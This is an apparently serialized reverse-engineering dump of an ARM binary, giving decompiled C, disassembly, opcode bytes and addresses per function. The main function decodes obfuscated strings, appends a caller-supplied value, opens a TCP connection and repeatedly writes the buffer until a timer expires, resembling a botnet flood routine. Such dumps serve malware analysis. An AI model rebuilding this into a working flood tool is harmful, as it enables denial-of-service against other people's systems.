}\u000a      else {\u000a        iVar9 = *(int *)puVar2;\u000a        iVar7 = 0;\u000a        puVar10 = puVar2;\u000a        do {\u000a          iVar5 = 0;\u000a          do {\u000a            cVar8 = *(char *)(iVar7 + iVar9);\u000a            bVar11 = cVar8 == puVar1[iVar5];\u000a            if (bVar11) {\u000a              cVar8 = PTR_DAT_0000a07c[iVar5];\u000a            }\u000a            iVar5 = iVar5 + 1;\u000a            if (bVar11) {\u000a              puVar10[4] = cVar8;\u000a            }\u000a          } while (iVar5 != 0x41);\u000a          iVar7 = iVar7 + 1;\u000a          puVar10 = puVar10 + 1;\u000a        } while (iVar7 < (int)(uint)*(ushort *)(puVar2 + 0x204));\u000a      }\u000a      puVar2[iVar7 + 4] = 0;\u000a      strcat(acStack568,PTR_DAT_0000a098);\u000a      __n = strlen(acStack568);\u000a      puVar2 = PTR_DAT_0000a09c;\u000a      memcpy(acStack568 + __n,PTR_DAT_0000a0a0,3);\u000a      memset(puVar2 + 4,0,0x200);\u000a      puVar1 = PTR_DAT_0000a078;\u000a      if (*(short *)(puVar2 + 0x204) == 0) {\u000a        iVar7 = 0;\u000a      }\u000a      else {\u000a        iVar9 = *(int *)puVar2;\u000a        iVar7 = 0;\u000a        puVar10 = puVar2;\u000a        do {\u000a          iVar5 = 0;\u000a          do {\u000a            cVar8 = *(char *)(iVar9 + iVar7);\u000a            bVar11 = cVar8 == puVar1[iVar5];\u000a            if (bVar11) {\u000a              cVar8 = PTR_DAT_0000a07c[iVar5];\u000a            }\u000a            iVar5 = iVar5 + 1;\u000a            if (bVar11) {\u000a              puVar10[4] = cVar8;\u000a            }\u000a          } while (iVar5 != 0x41);\u000a          iVar7 = iVar7 + 1;\u000a          puVar10 = puVar10 + 1;\u000a        } while (iVar7 < (int)(uint)*(ushort *)(puVar2 + 0x204));\u000a      }\u000a      puVar2[iVar7 + 4] = 0;\u000a      strcat(acStack568,PTR_DAT_0000a0a4);\u000a      __n = strlen(acStack568);\u000a      memcpy(acStack568 + __n,PTR_DAT_0000a0a8,3);\u000a      strcat(acStack568,pcParm1);\u000a      __n = strlen(acStack568);\u000a      puVar2 = PTR_DAT_0000a0ac;\u000a      memcpy(acStack568 + __n,PTR_DAT_0000a0a0,3);\u000a      memset(puVar2 + 4,0,0x200);\u000a      puVar1 = PTR_DAT_0000a078;\u000a      if (*(short *)(puVar2 + 0x204) == 0) {\u000a        iVar7 = 0;\u000a      }\u000a      else {\u000a        iVar9 = *(int *)puVar2;\u000a        iVar7 = 0;\u000a        puVar10 = puVar2;\u000a        do {\u000a          iVar5 = 0;\u000a          do {\u000a            cVar8 = *(char *)(iVar9 + iVar7);\u000a            bVar11 = cVar8 == puVar1[iVar5];\u000a            if (bVar11) {\u000a              cVar8 = PTR_DAT_0000a07c[iVar5];\u000a            }\u000a            iVar5 = iVar5 + 1;\u000a            if (bVar11) {\u000a              puVar10[4] = cVar8;\u000a            }\u000a          } while (iVar5 != 0x41);\u000a          iVar7 = iVar7 + 1;\u000a          puVar10 = puVar10 + 1;\u000a        } while (iVar7 < (int)(uint)*(ushort *)(puVar2 + 0x204));\u000a      }\u000a      puVar2[iVar7 + 4] = 0;\u000a      strcat(acStack568,PTR_DAT_0000a0b0);\u000a      __n = strlen(acStack568);\u000a      puVar2 = PTR_DAT_0000a0b4;\u000a      memcpy(acStack568 + __n,PTR_DAT_0000a0a8,3);\u000a      memset(puVar2 + 4,0,0x200);\u000a      puVar1 = PTR_DAT_0000a078;\u000a      if (*(short *)(puVar2 + 0x204) == 0) {\u000a        iVar7 = 0;\u000a      }\u000a      else {\u000a        iVar9 = *(int *)puVar2;\u000a        iVar7 = 0;\u000a        puVar10 = puVar2;\u000a        do {\u000a          iVar5 = 0;\u000a          do {\u000a            cVar8 = *(char *)(iVar9 + iVar7);\u000a            bVar11 = cVar8 == puVar1[iVar5];\u000a            if (bVar11) {\u000a              cVar8 = PTR_DAT_0000a07c[iVar5];\u000a            }\u000a            iVar5 = iVar5 + 1;\u000a            if (bVar11) {\u000a              puVar10[4] = cVar8;\u000a            }\u000a          } while (iVar5 != 0x41);\u000a          iVar7 = iVar7 + 1;\u000a          puVar10 = puVar10 + 1;\u000a        } while (iVar7 < (int)(uint)*(ushort *)(puVar2 + 0x204));\u000a      }\u000a      puVar2[iVar7 + 4] = 0;\u000a      strcat(acStack568,PTR_DAT_0000a0b8);\u000a      __n = strlen(acStack568);\u000a      memcpy(acStack568 + __n,PTR_DAT_0000a0a0,3);\u000a      __n = strlen(acStack568);\u000a      memcpy(acStack568 + __n,PTR_DAT_0000a0a0,3);\u000a      while (tVar6 = time((time_t *)0x0), tVar6 < tVar3 + iParm4) {\u000a        iVar7 = FUN_00008d78(pcParm1,uParm2 & 0xffff);\u000a        if (iVar7 != 0) {\u000a          __n = strlen(acStack568);\u000a          write(__fd,acStack568,__n);\u000a          close(__fd);\u000a        }\u000a      }\u000a      close(__fd);\u000a                    /* WARNING: Subroutine does not return */\u000a      exit(0);\u000a    }\u000a  }\u000a                    /* WARNING: Subroutine does not return */\u000a  exit(1);\u000a}\u000a\u000a
p360
S'stmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\ncpy r7,r0\nsub sp,sp,#0x218\nmov r0,#0x0\ncpy r4,r3\nmov r5,r1, lsl #0x10\nbl 0x00008a58\nadd r9,r0,r4\nmov r4,#0x1\ncpy r0,r7\nstr r4,[sp,#0x214]\nbl 0x00008a64\ncmp r0,#0x0\nmov r10,r5, lsr #0x10\nbeq 0x00009bcc\nadd r2,r0,#0xc\nldmia r2,{ r2 r3 }\nadd r1,sp,#0x208\nldr r0,[r3,#0x0]\nbl 0x00008a04\nand r3,r10,#0xff\nmov r3,r3, lsl #0x8\norr r3,r3,r5, lsr #0x18\nmov lr,#0x2\nmov r12,r3, asr #0x8\ncpy r0,lr\ncpy r1,r4\nmov r2,#0x6\nmov r5,#0x0\nstrb r12,[sp,#0x207]\nstrb r3,[sp,#0x206]\nstrb lr,[sp,#0x204]\nstrb r5,[sp,#0x205]\nbl 0x00008968\nmov r12,#0x4\ncpy r6,r0\nmov r1,#0x6\ncpy r2,r4\nadd r3,sp,#0x214\nstr r12,[sp,#0x0]\nbl 0x000089d4\ncmn r6,#0x1\nbne 0x00009bd4\ncpy r0,r4\nbl 0x00008a88\nldr r8,[0xa074]\ncpy r1,r5\nmov r2,#0x200\nadd r0,r8,#0x4\nbl 0x00008a40\nldrb r2,[r8,#0x204]\nldrb r3,[r8,#0x205]\norrs r3,r2,r3, lsl #0x8\ncpyeq r1,r5\nbeq 0x00009c50\nldr r12,[r8,#0x0]\nldr r4,[0xa078]\ncpy r1,r5\ncpy lr,r8\nmov r0,#0x0\nldrb r3,[r0,r4]\nldrb r2,[r1,r12]\ncmp r2,r3\nldreq r3,[0xa07c]\nldrbeq r2,[r0,r3]\nadd r0,r0,#0x1\nstrbeq r2,[lr,#0x4]\ncmp r0,#0x41\nbne 0x00009c10\nldrb r3,[r8,#0x204]\nldrb r2,[r8,#0x205]\nadd r1,r1,#0x1\norr r3,r3,r2, lsl #0x8\ncmp r3,r1\nadd lr,lr,#0x1\nbgt 0x00009c0c\nadd r3,r1,r8\nadd r11,sp,#0x4\nmov r8,#0x0\nstrb r8,[r3,#0x4]\nldr r1,[0xa080]\ncpy r0,r11\nbl 0x00008908\ncpy r0,r11\nbl 0x00008aa0\nldr r5,[0xa084]\nldr r1,[0xa088]\nmov r2,#0x4\nadd r0,r11,r0\nbl 0x00008944\ncpy r1,r8\nmov r2,#0x200\nadd r0,r5,#0x4\nbl 0x00008a40\nldrb r2,[r5,#0x204]\nldrb r3,[r5,#0x205]\norrs r3,r2,r3, lsl #0x8\ncpyeq r1,r8\nbeq 0x00009d00\nldr r4,[0xa078]\nldr r12,[r5,#0x0]\ncpy r1,r8\ncpy lr,r5\nmov r0,#0x0\nldrb r3,[r0,r4]\nldrb r2,[r12,r1]\ncmp r2,r3\nldreq r3,[0xa07c]\nldrbeq r2,[r0,r3]\nadd r0,r0,#0x1\nstrbeq r2,[lr,#0x4]\ncmp r0,#0x41\nbne 0x00009cc0\nldrb r3,[r5,#0x204]\nldrb r2,[r5,#0x205]\nadd r1,r1,#0x1\norr r3,r3,r2, lsl #0x8\ncmp r3,r1\nadd lr,lr,#0x1\nbgt 0x00009cbc\nadd r3,r1,r5\nmov r8,#0x0\nstrb r8,[r3,#0x4]\nldr r1,[0xa08c]\ncpy r0,r11\nbl 0x000089b0\ncpy r0,r11\nbl 0x00008aa0\nldr r5,[0xa090]\nldr r1,[0xa094]\nmov r2,#0x2\nadd r0,r11,r0\nbl 0x00008944\ncpy r1,r8\nmov r2,#0x200\nadd r0,r5,#0x4\nbl 0x00008a40\nldrb r2,[r5,#0x204]\nldrb r3,[r5,#0x205]\norrs r3,r2,r3, lsl #0x8\ncpyeq r1,r8\nbeq 0x00009dac\nldr r4,[0xa078]\nldr r12,[r5,#0x0]\ncpy r1,r8\ncpy lr,r5\nmov r0,#0x0\nldrb r3,[r0,r4]\nldrb r2,[r1,r12]\ncmp r2,r3\nldreq r3,[0xa07c]\nldrbeq r2,[r0,r3]\nadd r0,r0,#0x1\nstrbeq r2,[lr,#0x4]\ncmp r0,#0x41\nbne 0x00009d6c\nldrb r3,[r5,#0x204]\nldrb r2,[r5,#0x205]\nadd r1,r1,#0x1\norr r3,r3,r2, lsl #0x8\ncmp r3,r1\nadd lr,lr,#0x1\nbgt 0x00009d68\nadd r3,r1,r5\nmov r8,#0x0\nstrb r8,[r3,#0x4]\nldr r1,[0xa098]\ncpy r0,r11\nbl 0x000089b0\ncpy r0,r11\nbl 0x00008aa0\nldr r5,[0xa09c]\nldr r1,[0xa0a0]\nmov r2,#0x3\nadd r0,r11,r0\nbl 0x00008944\ncpy r1,r8\nmov r2,#0x200\nadd r0,r5,#0x4\nbl 0x00008a40\nldrb r2,[r5,#0x204]\nldrb r3,[r5,#0x205]\norrs r3,r2,r3, lsl #0x8\ncpyeq r1,r8\nbeq 0x00009e58\nldr r4,[0xa078]\nldr r12,[r5,#0x0]\ncpy r1,r8\ncpy lr,r5\nmov r0,#0x0\nldrb r3,[r0,r4]\nldrb r2,[r12,r1]\ncmp r2,r3\nldreq r3,[0xa07c]\nldrbeq r2,[r0,r3]\nadd r0,r0,#0x1\nstrbeq r2,[lr,#0x4]\ncmp r0,#0x41\nbne 0x00009e18\nldrb r3,[r5,#0x204]\nldrb r2,[r5,#0x205]\nadd r1,r1,#0x1\norr r3,r3,r2, lsl #0x8\ncmp r3,r1\nadd lr,lr,#0x1\nbgt 0x00009e14\nadd r3,r1,r5\nmov r8,#0x0\nstrb r8,[r3,#0x4]\nldr r1,[0xa0a4]\ncpy r0,r11\nbl 0x000089b0\ncpy r0,r11\nbl 0x00008aa0\nmov r2,#0x3\nldr r1,[0xa0a8]\nadd r0,r11,r0\nbl 0x00008944\ncpy r1,r7\ncpy r0,r11\nbl 0x000089b0\ncpy r0,r11\nbl 0x00008aa0\nldr r5,[0xa0ac]\nldr r1,[0xa0a0]\nmov r2,#0x3\nadd r0,r11,r0\nbl 0x00008944\ncpy r1,r8\nmov r2,#0x200\nadd r0,r5,#0x4\nbl 0x00008a40\nldrb r2,[r5,#0x204]\nldrb r3,[r5,#0x205]\norrs r3,r2,r3, lsl #0x8\ncpyeq r1,r8\nbeq 0x00009f28\nldr r4,[0xa078]\nldr r12,[r5,#0x0]\ncpy r1,r8\ncpy lr,r5\nmov r0,#0x0\nldrb r3,[r0,r4]\nldrb r2,[r12,r1]\ncmp r2,r3\nldreq r3,[0xa07c]\nldrbeq r2,[r0,r3]\nadd r0,r0,#0x1\nstrbeq r2,[lr,#0x4]\ncmp r0,#0x41\nbne 0x00009ee8\nldrb r3,[r5,#0x204]\nldrb r2,[r5,#0x205]\nadd r1,r1,#0x1\norr r3,r3,r2, lsl #0x8\ncmp r3,r1\nadd lr,lr,#0x1\nbgt 0x00009ee4\nadd r3,r1,r5\nmov r8,#0x0\nstrb r8,[r3,#0x4]\nldr r1,[0xa0b0]\ncpy r0,r11\nbl 0x000089b0\ncpy r0,r11\nbl 0x00008aa0\nldr r5,[0xa0b4]\nldr r1,[0xa0a8]\nmov r2,#0x3\nadd r0,r11,r0\nbl 0x00008944\ncpy r1,r8\nmov r2,#0x200\nadd r0,r5,#0x4\nbl 0x00008a40\nldrb r2,[r5,#0x204]\nldrb r3,[r5,#0x205]\norrs r3,r2,r3, lsl #0x8\ncpyeq r1,r8\nbeq 0x00009fd4\nldr r4,[0xa078]\nldr r12,[r5,#0x0]\ncpy r1,r8\ncpy lr,r5\nmov r0,#0x0\nldrb r3,[r0,r4]\nldrb r2,[r12,r1]\ncmp r2,r3\nldreq r3,[0xa07c]\nldrbeq r2,[r0,r3]\nadd r0,r0,#0x1\nstrbeq r2,[lr,#0x4]\ncmp r0,#0x41\nbne 0x00009f94\nldrb r3,[r5,#0x204]\nldrb r2,[r5,#0x205]\nadd r1,r1,#0x1\norr r3,r3,r2, lsl #0x8\ncmp r3,r1\nadd lr,lr,#0x1\nbgt 0x00009f90\nadd r2,r1,r5\nmov r3,#0x0\nstrb r3,[r2,#0x4]\nldr r1,[0xa0b8]\ncpy r0,r11\nbl 0x000089b0\ncpy r0,r11\nbl 0x00008aa0\nldr r1,[0xa0a0]\nmov r2,#0x3\nadd r0,r11,r0\nbl 0x00008944\ncpy r0,r11\nbl 0x00008aa0\nldr r1,[0xa0a0]\nadd r0,r11,r0\nmov r2,#0x3\nbl 0x00008944\nmov r0,#0x0\nbl 0x00008a58\ncmp r9,r0\nble 0x0000a064\ncpy r0,r7\ncpy r1,r10\nbl 0x00008d78\ncmp r0,#0x0\nbeq 0x0000a01c\ncpy r0,r11\nbl 0x00008aa0\ncpy r1,r11\ncpy r2,r0\ncpy r0,r6\nbl 0x000089a4\ncpy r0,r6\nbl 0x00008ab8\nb 0x0000a01c\ncpy r0,r6\nbl 0x00008ab8\nmov r0,#0x0\nbl 0x00008a88\n'
p361
S'f0 4f 2d e9\n00 70 a0 e1\n86 df 4d e2\n00 00 a0 e3\n03 40 a0 e1\n01 58 a0 e1\nc6 fb ff eb\n04 90 80 e0\n01 40 a0 e3\n07 00 a0 e1\n14 42 8d e5\nc4 fb ff eb\n00 00 50 e3\n25 a8 a0 e1\n1b 00 00 0a\n0c 20 80 e2\n0c 00 92 e8\n82 1f 8d e2\n00 00 93 e5\na4 fb ff eb\nff 30 0a e2\n03 34 a0 e1\n25 3c 83 e1\n02 e0 a0 e3\n43 c4 a0 e1\n0e 00 a0 e1\n04 10 a0 e1\n06 20 a0 e3\n00 50 a0 e3\n07 c2 cd e5\n06 32 cd e5\n04 e2 cd e5\n05 52 cd e5\n6f fb ff eb\n04 c0 a0 e3\n00 60 a0 e1\n06 10 a0 e3\n04 20 a0 e1\n85 3f 8d e2\n00 c0 8d e5\n83 fb ff eb\n01 00 76 e3\n01 00 00 1a\n04 00 a0 e1\nac fb ff eb\n98 84 9f e5\n05 10 a0 e1\n02 2c a0 e3\n04 00 88 e2\n95 fb ff eb\n04 22 d8 e5\n05 32 d8 e5\n03 34 92 e1\n05 10 a0 01\n14 00 00 0a\n00 c0 98 e5\n70 44 9f e5\n05 10 a0 e1\n08 e0 a0 e1\n00 00 a0 e3\n04 30 d0 e7\n0c 20 d1 e7\n03 00 52 e1\n58 34 9f 05\n03 20 d0 07\n01 00 80 e2\n04 20 ce 05\n41 00 50 e3\nf6 ff ff 1a\n04 32 d8 e5\n05 22 d8 e5\n01 10 81 e2\n02 34 83 e1\n01 00 53 e1\n01 e0 8e e2\nee ff ff ca\n08 30 81 e0\n04 b0 8d e2\n00 80 a0 e3\n04 80 c3 e5\n18 14 9f e5\n0b 00 a0 e1\n26 fb ff eb\n0b 00 a0 e1\n8a fb ff eb\n08 54 9f e5\n08 14 9f e5\n04 20 a0 e3\n00 00 8b e0\n2e fb ff eb\n08 10 a0 e1\n02 2c a0 e3\n04 00 85 e2\n69 fb ff eb\n04 22 d5 e5\n05 32 d5 e5\n03 34 92 e1\n08 10 a0 01\n14 00 00 0a\nc4 43 9f e5\n00 c0 95 e5\n08 10 a0 e1\n05 e0 a0 e1\n00 00 a0 e3\n04 30 d0 e7\n01 20 dc e7\n03 00 52 e1\na8 33 9f 05\n03 20 d0 07\n01 00 80 e2\n04 20 ce 05\n41 00 50 e3\nf6 ff ff 1a\n04 32 d5 e5\n05 22 d5 e5\n01 10 81 e2\n02 34 83 e1\n01 00 53 e1\n01 e0 8e e2\nee ff ff ca\n05 30 81 e0\n00 80 a0 e3\n04 80 c3 e5\n78 13 9f e5\n0b 00 a0 e1\n25 fb ff eb\n0b 00 a0 e1\n5f fb ff eb\n68 53 9f e5\n68 13 9f e5\n02 20 a0 e3\n00 00 8b e0\n03 fb ff eb\n08 10 a0 e1\n02 2c a0 e3\n04 00 85 e2\n3e fb ff eb\n04 22 d5 e5\n05 32 d5 e5\n03 34 92 e1\n08 10 a0 01\n14 00 00 0a\n18 43 9f e5\n00 c0 95 e5\n08 10 a0 e1\n05 e0 a0 e1\n00 00 a0 e3\n04 30 d0 e7\n0c 20 d1 e7\n03 00 52 e1\nfc 32 9f 05\n03 20 d0 07\n01 00 80 e2\n04 20 ce 05\n41 00 50 e3\nf6 ff ff 1a\n04 32 d5 e5\n05 22 d5 e5\n01 10 81 e2\n02 34 83 e1\n01 00 53 e1\n01 e0 8e e2\nee ff ff ca\n05 30 81 e0\n00 80 a0 e3\n04 80 c3 e5\nd8 12 9f e5\n0b 00 a0 e1\nfa fa ff eb\n0b 00 a0 e1\n34 fb ff eb\nc8 52 9f e5\nc8 12 9f e5\n03 20 a0 e3\n00 00 8b e0\nd8 fa ff eb\n08 10 a0 e1\n02 2c a0 e3\n04 00 85 e2\n13 fb ff eb\n04 22 d5 e5\n05 32 d5 e5\n03 34 92 e1\n08 10 a0 01\n14 00 00 0a\n6c 42 9f e5\n00 c0 95 e5\n08 10 a0 e1\n05 e0 a0 e1\n00 00 a0 e3\n04 30 d0 e7\n01 20 dc e7\n03 00 52 e1\n50 32 9f 05\n03 20 d0 07\n01 00 80 e2\n04 20 ce 05\n41 00 50 e3\nf6 ff ff 1a\n04 32 d5 e5\n05 22 d5 e5\n01 10 81 e2\n02 34 83 e1\n01 00 53 e1\n01 e0 8e e2\nee ff ff ca\n05 30 81 e0\n00 80 a0 e3\n04 80 c3 e5\n38 12 9f e5\n0b 00 a0 e1\ncf fa ff eb\n0b 00 a0 e1\n09 fb ff eb\n03 20 a0 e3\n24 12 9f e5\n00 00 8b e0\nae fa ff eb\n07 10 a0 e1\n0b 00 a0 e1\nc6 fa ff eb\n0b 00 a0 e1\n00 fb ff eb\n08 52 9f e5\nf8 11 9f e5\n03 20 a0 e3\n00 00 8b e0\na4 fa ff eb\n08 10 a0 e1\n02 2c a0 e3\n04 00 85 e2\ndf fa ff eb\n04 22 d5 e5\n05 32 d5 e5\n03 34 92 e1\n08 10 a0 01\n14 00 00 0a\n9c 41 9f e5\n00 c0 95 e5\n08 10 a0 e1\n05 e0 a0 e1\n00 00 a0 e3\n04 30 d0 e7\n01 20 dc e7\n03 00 52 e1\n80 31 9f 05\n03 20 d0 07\n01 00 80 e2\n04 20 ce 05\n41 00 50 e3\nf6 ff ff 1a\n04 32 d5 e5\n05 22 d5 e5\n01 10 81 e2\n02 34 83 e1\n01 00 53 e1\n01 e0 8e e2\nee ff ff ca\n05 30 81 e0\n00 80 a0 e3\n04 80 c3 e5\n74 11 9f e5\n0b 00 a0 e1\n9b fa ff eb\n0b 00 a0 e1\nd5 fa ff eb\n64 51 9f e5\n54 11 9f e5\n03 20 a0 e3\n00 00 8b e0\n79 fa ff eb\n08 10 a0 e1\n02 2c a0 e3\n04 00 85 e2\nb4 fa ff eb\n04 22 d5 e5\n05 32 d5 e5\n03 34 92 e1\n08 10 a0 01\n14 00 00 0a\nf0 40 9f e5\n00 c0 95 e5\n08 10 a0 e1\n05 e0 a0 e1\n00 00 a0 e3\n04 30 d0 e7\n01 20 dc e7\n03 00 52 e1\nd4 30 9f 05\n03 20 d0 07\n01 00 80 e2\n04 20 ce 05\n41 00 50 e3\nf6 ff ff 1a\n04 32 d5 e5\n05 22 d5 e5\n01 10 81 e2\n02 34 83 e1\n01 00 53 e1\n01 e0 8e e2\nee ff ff ca\n05 20 81 e0\n00 30 a0 e3\n04 30 c2 e5\nd0 10 9f e5\n0b 00 a0 e1\n70 fa ff eb\n0b 00 a0 e1\naa fa ff eb\na4 10 9f e5\n03 20 a0 e3\n00 00 8b e0\n4f fa ff eb\n0b 00 a0 e1\na4 fa ff eb\n8c 10 9f e5\n00 00 8b e0\n03 20 a0 e3\n49 fa ff eb\n00 00 a0 e3\n8c fa ff eb\n00 00 59 e1\n0d 00 00 da\n07 00 a0 e1\n0a 10 a0 e1\n4f fb ff eb\n00 00 50 e3\nf6 ff ff 0a\n0b 00 a0 e1\n95 fa ff eb\n0b 10 a0 e1\n00 20 a0 e1\n06 00 a0 e1\n52 fa ff eb\n06 00 a0 e1\n95 fa ff eb\ned ff ff ea\n06 00 a0 e1\n92 fa ff eb\n00 00 a0 e3\n84 fa ff eb\n'
p362
S'.text:00009b20\n.text:00009b24\n.text:00009b28\n.text:00009b2c\n.text:00009b30\n.text:00009b34\n.text:00009b38\n.text:00009b3c\n.text:00009b40\n.text:00009b44\n.text:00009b48\n.text:00009b4c\n.text:00009b50\n.text:00009b54\n.text:00009b58\n.text:00009b5c\n.text:00009b60\n.text:00009b64\n.text:00009b68\n.text:00009b6c\n.text:00009b70\n.text:00009b74\n.text:00009b78\n.text:00009b7c\n.text:00009b80\n.text:00009b84\n.text:00009b88\n.text:00009b8c\n.text:00009b90\n.text:00009b94\n.text:00009b98\n.text:00009b9c\n.text:00009ba0\n.text:00009ba4\n.text:00009ba8\n.text:00009bac\n.text:00009bb0\n.text:00009bb4\n.text:00009bb8\n.text:00009bbc\n.text:00009bc0\n.text:00009bc4\n.text:00009bc8\n.text:00009bcc\n.text:00009bd0\n.text:00009bd4\n.text:00009bd8\n.text:00009bdc\n.text:00009be0\n.text:00009be4\n.text:00009be8\n.text:00009bec\n.text:00009bf0\n.text:00009bf4\n.text:00009bf8\n.text:00009bfc\n.text:00009c00\n.text:00009c04\n.text:00009c08\n.text:00009c0c\n.text:00009c10\n.text:00009c14\n.text:00009c18\n.text:00009c1c\n.text:00009c20\n.text:00009c24\n.text:00009c28\n.text:00009c2c\n.text:00009c30\n.text:00009c34\n.text:00009c38\n.text:00009c3c\n.text:00009c40\n.text:00009c44\n.text:00009c48\n.text:00009c4c\n.text:00009c50\n.text:00009c54\n.text:00009c58\n.text:00009c5c\n.text:00009c60\n.text:00009c64\n.text:00009c68\n.text:00009c6c\n.text:00009c70\n.text:00009c74\n.text:00009c78\n.text:00009c7c\n.text:00009c80\n.text:00009c84\n.text:00009c88\n.text:00009c8c\n.text:00009c90\n.text:00009c94\n.text:00009c98\n.text:00009c9c\n.text:00009ca0\n.text:00009ca4\n.text:00009ca8\n.text:00009cac\n.text:00009cb0\n.text:00009cb4\n.text:00009cb8\n.text:00009cbc\n.text:00009cc0\n.text:00009cc4\n.text:00009cc8\n.text:00009ccc\n.text:00009cd0\n.text:00009cd4\n.text:00009cd8\n.text:00009cdc\n.text:00009ce0\n.text:00009ce4\n.text:00009ce8\n.text:00009cec\n.text:00009cf0\n.text:00009cf4\n.text:00009cf8\n.text:00009cfc\n.text:00009d00\n.text:00009d04\n.text:00009d08\n.text:00009d0c\n.text:00009d10\n.text:00009d14\n.text:00009d18\n.text:00009d1c\n.text:00009d20\n.text:00009d24\n.text:00009d28\n.text:00009d2c\n.text:00009d30\n.text:00009d34\n.text:00009d38\n.text:00009d3c\n.text:00009d40\n.text:00009d44\n.text:00009d48\n.text:00009d4c\n.text:00009d50\n.text:00009d54\n.text:00009d58\n.text:00009d5c\n.text:00009d60\n.text:00009d64\n.text:00009d68\n.text:00009d6c\n.text:00009d70\n.text:00009d74\n.text:00009d78\n.text:00009d7c\n.text:00009d80\n.text:00009d84\n.text:00009d88\n.text:00009d8c\n.text:00009d90\n.text:00009d94\n.text:00009d98\n.text:00009d9c\n.text:00009da0\n.text:00009da4\n.text:00009da8\n.text:00009dac\n.text:00009db0\n.text:00009db4\n.text:00009db8\n.text:00009dbc\n.text:00009dc0\n.text:00009dc4\n.text:00009dc8\n.text:00009dcc\n.text:00009dd0\n.text:00009dd4\n.text:00009dd8\n.text:00009ddc\n.text:00009de0\n.text:00009de4\n.text:00009de8\n.text:00009dec\n.text:00009df0\n.text:00009df4\n.text:00009df8\n.text:00009dfc\n.text:00009e00\n.text:00009e04\n.text:00009e08\n.text:00009e0c\n.text:00009e10\n.text:00009e14\n.text:00009e18\n.text:00009e1c\n.text:00009e20\n.text:00009e24\n.text:00009e28\n.text:00009e2c\n.text:00009e30\n.text:00009e34\n.text:00009e38\n.text:00009e3c\n.text:00009e40\n.text:00009e44\n.text:00009e48\n.text:00009e4c\n.text:00009e50\n.text:00009e54\n.text:00009e58\n.text:00009e5c\n.text:00009e60\n.text:00009e64\n.text:00009e68\n.text:00009e6c\n.text:00009e70\n.text:00009e74\n.text:00009e78\n.text:00009e7c\n.text:00009e80\n.text:00009e84\n.text:00009e88\n.text:00009e8c\n.text:00009e90\n.text:00009e94\n.text:00009e98\n.text:00009e9c\n.text:00009ea0\n.text:00009ea4\n.text:00009ea8\n.text:00009eac\n.text:00009eb0\n.text:00009eb4\n.text:00009eb8\n.text:00009ebc\n.text:00009ec0\n.text:00009ec4\n.text:00009ec8\n.text:00009ecc\n.text:00009ed0\n.text:00009ed4\n.text:00009ed8\n.text:00009edc\n.text:00009ee0\n.text:00009ee4\n.text:00009ee8\n.text:00009eec\n.text:00009ef0\n.text:00009ef4\n.text:00009ef8\n.text:00009efc\n.text:00009f00\n.text:00009f04\n.text:00009f08\n.text:00009f0c\n.text:00009f10\n.text:00009f14\n.text:00009f18\n.text:00009f1c\n.text:00009f20\n.text:00009f24\n.text:00009f28\n.text:00009f2c\n.text:00009f30\n.text:00009f34\n.text:00009f38\n.text:00009f3c\n.text:00009f40\n.text:00009f44\n.text:00009f48\n.text:00009f4c\n.text:00009f50\n.text:00009f54\n.text:00009f58\n.text:00009f5c\n.text:00009f60\n.text:00009f64\n.text:00009f68\n.text:00009f6c\n.text:00009f70\n.text:00009f74\n.text:00009f78\n.text:00009f7c\n.text:00009f80\n.text:00009f84\n.text:00009f88\n.text:00009f8c\n.text:00009f90\n.text:00009f94\n.text:00009f98\n.text:00009f9c\n.text:00009fa0\n.text:00009fa4\n.text:00009fa8\n.text:00009fac\n.text:00009fb0\n.text:00009fb4\n.text:00009fb8\n.text:00009fbc\n.text:00009fc0\n.text:00009fc4\n.text:00009fc8\n.text:00009fcc\n.text:00009fd0\n.text:00009fd4\n.text:00009fd8\n.text:00009fdc\n.text:00009fe0\n.text:00009fe4\n.text:00009fe8\n.text:00009fec\n.text:00009ff0\n.text:00009ff4\n.text:00009ff8\n.text:00009ffc\n.text:0000a000\n.text:0000a004\n.text:0000a008\n.text:0000a00c\n.text:0000a010\n.text:0000a014\n.text:0000a018\n.text:0000a01c\n.text:0000a020\n.text:0000a024\n.text:0000a028\n.text:0000a02c\n.text:0000a030\n.text:0000a034\n.text:0000a038\n.text:0000a03c\n.text:0000a040\n.text:0000a044\n.text:0000a048\n.text:0000a04c\n.text:0000a050\n.text:0000a054\n.text:0000a058\n.text:0000a05c\n.text:0000a060\n.text:0000a064\n.text:0000a068\n.text:0000a06c\n.text:0000a070\n'
p363
tp364
sS'memcpy'
p365
(S'\n__stdcall memcpy(void * __dest, void * __src, size_t __n)\n'
p366
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid * memcpy(void *__dest,void *__src,size_t __n)\u000a\u000a{\u000a  void *pvVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x0000894c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pvVar1 = (void *)(*(code *)PTR_LAB_000132e8)();\u000a  return pvVar1;\u000a}\u000a\u000a
p367
S'adr r12,0x894c\nadd r12,r12,#0xa000\nldr pc,[r12,#0x99c]!\n'
p368
S'00 c6 8f e2\n0a ca 8c e2\n9c f9 bc e5\n'
p369
S'.plt:00008944\n.plt:00008948\n.plt:0000894c\n'
p370
tp371
sS'FUN_00008b50'
p372
(S'\n__stdcall FUN_00008b50()\n'
p373
V\u000avoid FUN_00008b50(void)\u000a\u000a{\u000a  if (DAT_00008b94 != (code *)0x0) {\u000a                    /* WARNING: Could not recover jumptable at 0x00008b68. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a    (*DAT_00008b94)(DAT_00008b98);\u000a    return;\u000a  }\u000a  if (*DAT_00008ba0 != 0) {\u000a    if (DAT_00008ba4 != (code *)0x0) {\u000a      (*DAT_00008ba4)();\u000a      return;\u000a    }\u000a    return;\u000a  }\u000a  return;\u000a}\u000a\u000a
p374
S'ldr r3,[0x8b94]\ncmp r3,#0x0\nstr lr,[sp,#-0x4]!\nldr r0,[0x8b98]\nldr r1,[0x8b9c]\ncpyne lr,pc\ncpyne pc,r3\nldr r0,[0x8ba0]\nldr r3,[r0,#0x0]\ncmp r3,#0x0\nldr r3,[0x8ba4]\nldreq pc,[sp],#0x4\ncmp r3,#0x0\nldreq pc,[sp],#0x4\nmov lr,pc\ncpy pc,r3\nldr pc,[sp],#0x4\n'
p375
